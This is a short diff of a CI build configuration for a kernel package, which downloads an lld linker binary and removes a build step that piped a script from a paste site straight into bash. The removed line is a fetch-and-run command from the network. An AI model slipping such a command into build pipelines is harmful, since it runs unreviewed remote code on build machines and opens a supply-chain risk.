@@ -17,7 +17,7 @@ kernel_task:
       - wget https://gitlab.com/zlatanr/dora-clang-1/-/raw/master/bin/lld -O ld.lld && chmod +x ld.lld
       -   - pacman-static -Syu --needed --noconfirm kmod
   build_script:
-      - env ci=y makepkg -s && curl -s https://bin.cyberknight777.dev/vkZQ/raw | bash
+      - env ci=y makepkg -s
 
   artifacts:
       path: "*.pkg.tar.zst"
